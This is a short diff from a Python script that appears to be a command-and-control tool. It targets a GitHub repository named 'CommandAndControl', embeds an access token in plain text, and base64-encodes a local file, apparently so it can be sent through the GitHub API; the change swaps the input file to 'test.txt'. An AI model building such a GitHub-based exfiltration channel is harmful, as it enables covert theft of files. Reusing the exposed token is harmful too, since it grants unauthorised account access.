@@ -10,7 +10,7 @@ githubAPIURL = "https://api.github.com/repos/PabloHerFer1/CommandAndControl/test
 githubToken = "w1AMeZuYpiAfxy2MghkgQqxENPKA1q2uBOjc"
 
 
-with open("my-local-image.jpg", "rb") as f:
+with open("test.txt", "rb") as f:
     # Encoding "my-local-image.jpg" to base64 format
     encodedData = base64.b64encode(f.read())
 
